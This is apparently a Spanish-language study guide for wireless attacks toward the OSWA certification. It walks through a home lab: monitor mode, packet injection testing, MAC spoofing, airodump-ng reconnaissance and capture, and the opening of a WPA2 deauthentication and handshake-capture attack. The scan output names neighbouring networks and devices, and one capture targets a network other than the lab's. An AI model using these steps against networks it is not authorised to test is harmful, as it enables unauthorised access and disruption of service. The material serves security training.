# Fz3r0 - BlackShark v3.7

### _Networking &amp; Cyber-Security PCAP Analysis cyber-weapon_

## Introducción

Todo esto apenas está en constucción!!!

Por el momento dividiré el conocimiento en CWAP y OSWA, el CWNA ya lo abordé en el índice, pero lo iré metiendo aquí también. 

## Fz3r0 - El camino al OSWA
_(Offensive Security Wireless Attacks)_

## Índice

- Laboratiorio Fz3r0

    - PC
    - Sistema Operativo
    - Antenas WiFi
    - Router WiFi

- Cyber-Weapons & Tools

- Aircrack NG Cheatsheets


- Direccionamiento IP 

- Interfaces de Red

    - Cambiando el nombre largo de la WLAN0 en parrot

- Modo Monitor _(Promiscuo o escucha)_

    - Configurando ALFA en modo monitor
    - Eliminar los errores iniciales y Procesos Conflictivos

- MACchanger | MAC Spoofing 
- Modo Monitor

## Laboratorio Fz3r0

### PC 1

- Host Name: FZ3R0_PC
- Processor: CPU: 12th Gen Intel i9-12900K (16) @ 3.187GHz
- Chipset: Alder Lake z690
- RAM: 64gb DDR5 4,700 Mhz
- Board: Asus ROG Strix z690-E Gaming WiFi
- Graphics: Nvidia GeForce RTX 3080 10gb - ROG Strix

### Sistema Operativo

- OS Base: Microsoft Windows 11 Pro - 10.0.22621 N/A Build 22621               
- OS VM: (Linux) Parrot OS 5.1 (Electro Ara) x86_64
- Host: VMware Virtual Platform None
- Kernel: 6.0.0-12parrot1-amd64
- Shell: zsh 5.8
- WM: bspwm
- Terminal: kitty

---

### PC 2

c8:94:02:b9:10:33

- Host Name: FZ3R0_SECONDARY
- Processor: CPU: 12th Gen Intel i9-12900K (16) @ 3.187GHz
- Chipset: Alder Lake z690
- RAM: 64gb DDR5 4,700 Mhz
- Board: Asus ROG Strix z690-E Gaming WiFi
- Graphics: Nvidia GeForce RTX 3080 10gb - ROG Strix

### Sistema Operativo

- OS Base: Microsoft Windows 11 Pro - 10.0.22621 N/A Build 22621               

---

### Antenas WiFi

- Se necesita una NIC en `modo monitor` para capturar el `4-way-handshake`. _Muchas tarjetas inalámbricas admiten esto, pero es importante tener en cuenta que no todas lo hacen_

- El `modo de inyección` ayuda, ya que se puede utilizar para un `deauthentication attack`. _De otro modo, se debe esperar a que un cliente se conecte normalmente._

- En mi caso utilizaré la **`ALFA AWUS1900`**

---

### Router WiFi

1. Celular Hotspot

    - Haré en sus mayores casos experimentos con mi celular en modo Hotspot para replicar un modem-

    - Utilizaré un SSID: `Fz3r0_Air_PWN`

    - Password `password10` (Utilizaré `rockyou.txt` en este lab, leer punto 3.)

2. Modem WiFi

    - También utilizaré mi módem casero

3. Generar contraseñas de `rockyou.txt` (Hice un script especial para esto, why not?)

````sh
#!/bin/bash

    # Github:   Fz3r0

    # Twitter:  @Fz3r0_OPs

    # Youtube:  @Fz3r0_OPs

counter=0
clear
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "              Generador de Passwords Estúpidos v1.0 by Fz3r0"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos."
echo ""
echo "[+] ¡No utlizar ninguno de estos Passwords en Producción!" 
echo ""
echo "[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!"
echo ""
echo "[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:"
echo ""
#Obtenemos las primeras 10000 lineas del archivo rockyou.txt
head -10000 /usr/share/wordlists/rockyou.txt | shuf | while read line; do
    # Verificamos si la línea tiene 10 o más caracteres
    if [[ ${#line} -ge 10 ]]; then
        #Imprimimos la linea
        echo $line
        #Incrementamos el contador en 1
        counter=$((counter+1))
        #Verificamos si el contador ha alcanzado 5
        if [[ $counter -eq 5 ]]; then
            #Salimos del ciclo
            break
        fi
    fi
done
````

### PoC

````java
              Generador de Passwords Estúpidos v1.0 by Fz3r0

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-

[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos.

[+] ¡No utlizar ninguno de estos Passwords en Producción!

[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!

[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-

    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:

password10          <<<------- ESTE SERÁ EL PASSWORD DEFAULT DEL LAB
angelbaby1
mypictures
playboybunny
jonasbrothers
````


## Cyber-Weapons & Tools

- `aircrack-ng Suite` - Suite Auditoría WiFi

- `pyrit` - WEP

- `macchanger` - MAC Spoofing

- `ghex` - Editor Hexadecimal


## Aircrack NG Cheatsheets

- https://yisux.wordpress.com/2009/03/11/aircrack-ng-comandos-basicos-para-ataques-con-clientes-asociados/    


## Instalación, compilación y validación del HandShake con Pyrit



## Direccionamiento IP

- Trabajaré con IPv4

- OJO! Yo **pondré por `DHCP`** todos mis dispositivos para este laboratorio y se facilite más estar cambiando de redes, routers, antenas, etc. 

- En caso de usar IP fija habrá que modificarla cada vez que cambie desde el Hotspot celular, hacia el Router WiFi, etc. 

## Interfaces de Red

```sh
❯ hostname -I
192.168.30.152 
```

```sh
❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.152  netmask 255.255.255.0  broadcast 192.168.30.255
        inet6 fe80::9eaf:99f4:2e12:7c8e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:81:e8:b3  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 585 (585.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 68  bytes 17857 (17.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68  bytes 17857 (17.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```sh
❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.
```

- Para que la detecte solo hay que conectarla una vez abierta la VM y mandarla hacia el parrot

```sh
❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.152  netmask 255.255.255.0  broadcast 192.168.30.255
        inet6 fe80::9eaf:99f4:2e12:7c8e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:81:e8:b3  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 585 (585.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1334 (1.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 150  bytes 35489 (34.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 150  bytes 35489 (34.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlx00c0cab0c9a8: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500          <<<---- ALFA 
        ether a2:0f:66:1c:a5:7f  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

- ALFA = **`wlx00c0cab0c9a8`**

## Cambiando el nombre largo de la WLAN0 en parrot

- https://www.youtube.com/watch?v=PxBqLRlBgFQ

1. `lsb_release -a`

```sh
❯ lsb_release -a
No LSB modules are available.
Distributor ID:	Parrot
Description:	Parrot OS 5.1 (Electro Ara)
Release:	5.1
Codename:	ara
```

2. revisar `iwconfig`

3. tirar: `ln -s /dev/null /etc/udev/rules.d/80-net-setup-link.rules`

4. `reboot now`

5. revisar `iwconfig` done!! :D 

```sh
❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.

wlan0     unassociated  Nickname:"WIFI@RTL8814AU"
          Mode:Managed  Frequency=2.412 GHz  Access Point: Not-Associated    <<<------ A HUEVOOO!!!!
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
``` 

## `airmon` Modo Monitor (Promiscuo o escucha)

- El modo monitor (modo promiscuo o modo escucha) y el modo de captura nativa o normal son los dos modos de captura de datos soportados por las tarjetas wifi en Windows y a continuación veremos las diferencias de realizar una captura en modo monitor vs nativa.

- Mientras que la captura en modo normal, se centra en identificar puntos de acceso wifi, en la captura en modo monitor, se pueden capturar todos los paquetes wifi, incluidos los de datos.

- Dependiendo del tipo de captura, nativa o modo monitor, obtendremos un nivel diferente  información sobre nuestra red WiFi y dispositivos alrededor, a continuación vemos las diferencias para cada uno de estos tipos de captura.

- https://www.acrylicwifi.com/blog/modo-monitor-wifi/#:~:text=El%20modo%20monitor%20es%20el,Beacon)%2C%20Data%20y%20Control.

### Configurando ALFA en modo monitor

- Para comenzar y terminar el modo monitor se utiliza:

```sh
airmon-ng check kill
```
```sh
airmon-ng start wlan0
```
```sh
airmon-ng stop wlan0
```

- Siempre hacer un restart al final que ya se haya parado:

```sh
service network-manager restart
```
- ó:

```sh
/etc/init.d/networking restart
```
- Utilizando `airmon-ng` se utiliza el nombre de la interface y se comienza la escucha:

    - _**NOTA:** La primera vez es seguro de este tipo de errores, es porque otras interfaces pueden hacer conflicto con el modo monitor/promiscuo:_

- Revisar canal

```sh
iwlist channel
```
- Cambiar canal (ej, 2.4ghz ch 11)

```sh
iwconfig wlan0 channel 11
```

- Cambiar de banda (2.4 GHz / 5 GHz)

````sh
iwconfig wlp2so freq 2.4G

iwconfig wlp2so channel 44
````


```sh
❯ airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    718 NetworkManager
    750 wpa_supplicant

PHY	Interface	Driver		Chipset

phy0	wlan0		rtl8814au	Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
		(monitor mode enabled)
```

- No obstante los errores, al hacer `iwconfig` ahora ya puedo ver la interffaz es modo monitor:

```sh
❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.

wlan0     IEEE 802.11b  ESSID:""  Nickname:"WIFI@RTL8814AU"
          Mode:Monitor  Frequency:2.457 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```
- En caso que haya estado apagada solo hay que encenderla, por cualquier modo yo siempre hago este comando:

```sh
ifconfig wlan0 up
```

- Al final se ve algo así:

```sh
❯ ifconfig wlan0 up


❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.152  netmask 255.255.255.0  broadcast 192.168.30.255
        inet6 fe80::9eaf:99f4:2e12:7c8e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:81:e8:b3  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 585 (585.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 1396 (1.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 240  bytes 55569 (54.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 240  bytes 55569 (54.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        unspec 12-A7-79-AE-78-D1-00-D5-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 322  bytes 0 (0.0 B)
        RX errors 0  dropped 322  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.

wlan0     IEEE 802.11b  ESSID:""  Nickname:"WIFI@RTL8814AU"
          Mode:Monitor  Frequency:2.457 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

- Cuando se apaga el monitor, se regresa a manged:

```sh
❯ airmon-ng stop wlan0

PHY	Interface	Driver		Chipset

phy0	wlan0		rtl8814au	Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
		(monitor mode disabled)


❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.152  netmask 255.255.255.0  broadcast 192.168.30.255
        inet6 fe80::9eaf:99f4:2e12:7c8e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:81:e8:b3  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 585 (585.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 1396 (1.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 284  bytes 65473 (63.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 284  bytes 65473 (63.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 0e:ad:c4:82:cf:2c  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 593  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.

wlan0     unassociated  Nickname:"WIFI@RTL8814AU"
          Mode:Managed  Frequency=2.457 GHz  Access Point: Not-Associated        <<<----------- MANAGED (MONITOR OFF)
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

## Verificar si la antena inyecta paquetes

```sh
aireplay-ng -9 wlan0
```
```sh
❯ aireplay-ng -9 wlan0
14:33:09  Trying broadcast probe requests...
14:33:10  Injection is working!
14:33:11  Found 3 APs

14:33:11  Trying directed probe requests...
14:33:11  D8:0D:17:C4:ED:0D - channel: 1 - 'NETHOME-LRA'
14:33:15  Ping (min/avg/max): 8.248ms/52.715ms/136.073ms Power: -51.14
14:33:15  14/30:  46%

14:33:15  30:45:96:D7:F2:3E - channel: 1 - 'Fz3r0_Air_PWN'
14:33:21  Ping (min/avg/max): 104.506ms/139.789ms/186.260ms Power: -20.00
14:33:21   6/30:  20%

14:33:21  E4:A1:E6:2B:D3:84 - channel: 1 - 'NETHOME-LRA'
14:33:26  Ping (min/avg/max): 15.977ms/86.796ms/172.391ms Power: -60.00
14:33:26  10/30:  33%
```


### Eliminar los errores iniciales y Procesos Conflictivos

- Los procesos conflictivos:

```sh
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    718 NetworkManager
    750 wpa_supplicant
```

1. **Opción 1 -** 

````sh
pkill dhclient && pkill wpa_supplicant
````
- Modo contraído:

````sh
killall dhclient wpa_supplicant
````

2. **Opción 2 - MÁS FÁCIL** 

```sh
airmon-ng check kill
```

````SH
❯ airmon-ng check kill

Killing these processes:

    PID Name
 263580 wpa_supplicant

❯ airmon-ng start wlan0


PHY	Interface	Driver		Chipset

phy0	wlan0		rtl8814au	Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
		(monitor mode enabled)
````

- Recordar siempre reinciar al hacer stop:

```sh
/etc/init.d/networking restart
```


## MAC Spoofing (Modificar MAC)

### Ejemplo Final:

````sh
ifconfig wlan0 down && macchanger --mac=c4:10:8a:f0:f0:f0 wlan0 && ifconfig wlan0 up
````

### Pasos para MAC Spoofing:

- Help

```sh
❯ macchanger -h
GNU MAC Changer
Usage: macchanger [options] device

  -h,  --help                   Print this help
  -V,  --version                Print version and exit
  -s,  --show                   Print the MAC address and exit
  -e,  --ending                 Dont change the vendor bytes
  -a,  --another                Set random vendor MAC of the same kind
  -A                            Set random vendor MAC of any kind
  -p,  --permanent              Reset to original, permanent hardware MAC
  -r,  --random                 Set fully random MAC
  -l,  --list[=keyword]         Print known vendors
  -b,  --bia                    Pretend to be a burned-in-address
  -m,  --mac=XX:XX:XX:XX:XX:XX
       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX

Report bugs to https://github.com/alobbs/macchanger/issues
```

- Para mostrar la MAC de mi ALFA `wlan0` con `macchanger` su usa `s`:

```sh

❯ iwconfig
lo        no wireless extensions.

ens33     no wireless extensions.

wlan0     IEEE 802.11b  ESSID:""  Nickname:"WIFI@RTL8814AU"
          Mode:Monitor  Frequency:2.457 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0


❯ macchanger -s wlan0
Current MAC:   00:c0:ca:b0:c9:a8 (ALFA, INC.)
Permanent MAC: 00:c0:ca:b0:c9:a8 (ALFA, INC.)
```

- Ahí tengo por default mi current y permanent con la original de la ALFA y si OUI. 

### Asignar OUIs desde macchanger

- Ejemplos:

```sh
macchanger -l | grep "Apple"
```
```sh
macchanger -l | grep "NATIONAL SECURITY AGENCY"
```
```sh
❯ macchanger -l | grep "Ruckus"
4983 - 00:13:92 - Ruckus Wireless
7443 - 00:1d:2e - Ruckus Wireless
7974 - 00:1f:41 - Ruckus Wireless
8804 - 00:22:7f - Ruckus Wireless
9316 - 00:24:82 - Ruckus Wireless
9636 - 00:25:c4 - Ruckus Wireless
12736 - 04:4f:aa - Ruckus Wireless
13715 - 24:c9:a1 - Ruckus Wireless
13885 - 2c:5d:93 - Ruckus Wireless
13932 - 2c:e6:cc - Ruckus Wireless
14734 - 50:a7:33 - Ruckus Wireless
14788 - 54:3d:37 - Ruckus Wireless
14901 - 58:93:96 - Ruckus Wireless
15306 - 68:92:34 - Ruckus Wireless
15410 - 6c:aa:b3 - Ruckus Wireless
15605 - 74:91:1a - Ruckus Wireless
16164 - 8c:0c:90 - Ruckus Wireless
16987 - ac:67:06 - Ruckus Wireless
17495 - c0:8a:de - Ruckus Wireless
17520 - c0:c5:20 - Ruckus Wireless
17538 - c4:01:7c - Ruckus Wireless
17546 - c4:10:8a - Ruckus Wireless
```

### Asignar NIC Specific y hacer Spoofing

- El resto de la MAC puede ser random _MIENTRAS SEA HEXADECIMAL (0-9 & A-F)_

    - Ejemplo Ruckus: `c4:10:8a:f0:f0:f0`

- **MAC Spoofing:**

1. Primero **APAGAR** la interface `wlan0`:

````sh
ifconfig wlan0 down
````

2. Realizar el cambio:

````sh
macchanger --mac=c4:10:8a:f0:f0:f0 wlan0
````
````sh
❯ ifconfig wlan0 down
❯ macchanger --mac=c4:10:8a:f0:f0:f0 wlan0
Current MAC:   00:c0:ca:b0:c9:a8 (ALFA, INC.)
Permanent MAC: 00:c0:ca:b0:c9:a8 (ALFA, INC.)
New MAC:       c4:10:8a:f0:f0:f0 (Ruckus Wireless)  <<<------ NEW MAC!!!!
````

3. **ENCENDER** la interface `wlan0` y revisar el cambio:

````sh
❯ ifconfig wlan0 up

❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::9eaf:99f4:2e12:7c8e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:81:e8:b3  txqueuelen 1000  (Ethernet)
        RX packets 77  bytes 15605 (15.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 64  bytes 9692 (9.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10676  bytes 2448113 (2.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10676  bytes 2448113 (2.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        unspec C4-10-8A-F0-F0-F0-00-07-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)  <<<----- "Ruckus F0:F0:F0"
        RX packets 1734  bytes 0 (0.0 B)
        RX errors 0  dropped 69932  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
````

- Listo!

````sh
❯ macchanger -s wlan0
Current MAC:   c4:10:8a:f0:f0:f0 (Ruckus Wireless)
Permanent MAC: 00:c0:ca:b0:c9:a8 (ALFA, INC.)
````

- https://wiki.archlinux.org/title/MAC_address_spoofing_(Espa%C3%B1ol)


# Airodump


## `Airodump` para efectuar un análisis del entorno

````sh
airodump-ng wlan0 
````
````sh
CH  8 ][ Elapsed: 12 s ][ 2023-01-20 09:28  <<<---- Channel Hopping para verificar cada canal

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:45:96:D7:F2:3E  -37       33        0    0   1   65   WPA2 CCMP   PSK  Fz3r0_Air_PWN      <<<--- Test                                           
 50:4E:DC:90:2E:B8  -36       36       79    1   6  130   WPA2 CCMP   PSK  T҉a҉z҉ ҉T҉i҉t҉a҉🐱🐶                           
 D8:0D:17:C4:ED:0D  -49       35        7    0   1  130   WPA2 CCMP   PSK  NETHOME-LRA                                                
 E4:A1:E6:2B:D3:84  -57       23        7    0   1  130   WPA2 CCMP   PSK  NETHOME-LRA                                                
 F8:6C:E1:83:7A:99  -69        6        4    0  11  130   WPA2 CCMP   PSK  INFINITUM20E0_2.4                                          

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   5C:AA:FD:27:14:9D  -66    0 - 1     24        4         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   5C:AA:FD:27:12:A3  -67    0 - 1     25        4         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   5E:AA:FD:12:70:0F  -70    0 - 1     25        2         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   78:28:CA:6D:BE:81  -73    0 - 1     25        2         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 50:4E:DC:90:2E:B8  E4:3E:D7:A2:99:AF  -65    1e- 1e     3       33                                                                    
 50:4E:DC:90:2E:B8  24:11:45:37:8D:F0  -69    1e- 1      0       55                                                                    
 50:4E:DC:90:2E:B8  10:3F:44:5C:BC:D7  -61    0 - 1      0        7                                                                    
 D8:0D:17:C4:ED:0D  5C:AA:FD:27:12:A2  -64    0 -24      0        1                                                                    
 E4:A1:E6:2B:D3:84  DA:0D:16:1A:74:07  -51    0 - 1e     0        1                                                                    
Quitting...
````

- La parte superior equivale a los probes de APs o WiFi Routers. **`AP Probes`**

- La parte inferior son las STA sin asociar que están buscando un AP reconocido. **`STA Probe Request`**

## `Airodump` Modos de filtro

1. Poner la red en modo monitor `airmon-ng start wlan0`

2. Efectuar análisis de entorno `airodump-ng wlan0 `

3. Seleccionar la red que quiero filtrar en mi caso será `30:45:96:D7:F2:3E | Fz3r0_Air_PWN`

    - Puedo seleccionar cualquiera de los datos que puse en 3., ya sea `BSSID` o `SSID`:

        - `airodump-ng --essid Fz3r0_Air_PWN wlan0`

    - Puedo filtrar por canal `-c`: 

        - `airodump-ng -c 1 wlan0 `

    - Combinaciones:    

        - `airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0`

````sh
 CH 14 ][ Elapsed: 1 min ][ 2023-01-20 09:33 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:45:96:D7:F2:3E  -40      231        0    0   1   65   WPA2 CCMP   PSK  Fz3r0_Air_PWN  <<<--- Filtro                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   5C:AA:FD:27:14:9D  -66    0 - 1     24       16         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   5C:AA:FD:27:12:A3  -67    0 - 1     28       13         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   5E:AA:FD:12:70:0F  -70    0 - 1     25       16         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
 (not associated)   78:28:CA:6D:BE:81  -75    0 - 1      0        6         Sonos_D3W3kUHXXbBL7fD1q2Uxgv3J7k                           
Quitting...
````

- Más ejemplos:

```java
Filter options:
      --encrypt   <suite>   : Filter APs by cipher suite
      --netmask <netmask>   : Filter APs by mask
      --bssid     <bssid>   : Filter APs by BSSID
      --essid     <essid>   : Filter APs by ESSID
      --essid-regex <regex> : Filter APs by ESSID using a regular
                              expression
      -a                    : Filter unassociated clients
```    

## `Airodump` Exportar Evidencias

- Solo es necesario agregar el `-w` de write en el directorio que queremos guardar:

````sh
airodump-ng -c 1 --essid NETHOME-LRA wlan0 -w captura_wifi_fz3r0
````

- Después se mostrarán los siguientes files en el directorio, el que interesa por ahora es `captura_wifi_fz3r0-01.cap`:

```sh
❯ ll
.rw-r--r-- root root 9.1 KB Wed Jan 18 22:02:48 2023  captura_wifi_fz3r0-01.cap   <<<------ .cap = Aquí está el pass encriptado y más...
.rw-r--r-- root root 1.2 KB Wed Jan 18 22:02:48 2023  captura_wifi_fz3r0-01.csv
.rw-r--r-- root root 858 B  Wed Jan 18 22:02:48 2023  captura_wifi_fz3r0-01.kismet.csv
.rw-r--r-- root root  14 KB Wed Jan 18 22:02:48 2023  captura_wifi_fz3r0-01.kismet.netxml
.rw-r--r-- root root  52 KB Wed Jan 18 22:02:48 2023  captura_wifi_fz3r0-01.log.csv
```

- Ahora se ejecuta el comando `watch` para observar esa red, en este caso cada segundo `-s 1`

    - OJO!!! Se deben tener 2 ventanas abiertas, una que está en el modo monitor y la otra ""observando:
    - OJO 2!!! En caso de que se acumulen archivos, hay que tener cuidado de que ambos realmente sean el mismo archivo!!! Sino es mejor borrar y empezar de nuevo

        1. `airodump-ng -c 1 --essid NETHOME-LRA wlan0 -w captura_wifi_fz3r0-01.cap`
        2. `watch -n 1 du -hc captura_wifi_fz3r0-01.cap`

````sh
watch -n 1 du -hc captura_wifi_fz3r0-01.cap
````

- Con el tiempo se irá guardando la data de ese SSID. 


# Vulneración de redes WPA/WPA2 (PSK)


## ¿Qué es HandShake?

- https://hacking-etico.com/2013/05/08/redes-wifi-con-wpawpa2inviolables/#:~:text=El%20handshake%20es%2C%20a%20grosso,la%20contrase%C3%B1a%20WiFi%20pero%20cifrada.

- En resumen, el handshake es la autenticación que viaja por el aire, eso lo vimos en CWNA... jeje, así que en resumen eso lo podemos capturar con Wireshark o en este caso en este curstio de hacking :) 

## `aireplay-ng` De-authetication Attack: `Directed`

- Red a vulnerar: `Fz3r0_Air_PWN`
- Pass: `password10`
- PC-2: `C8:94:02:B9:10:33`

- Para dirigirlo se puede seleccionar la `MAC Address` del cliente, por ejemplo, uno que envíe muchos frames (osea que esté activo en ese momento, esto me podría garantizar de cierta manera que el cliente se va a reconectar).

- En airplay se puede usar ya sea `--deauth` o `-0` para hacer el ataque de deauth, también hay otras opciones: 

```java
Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
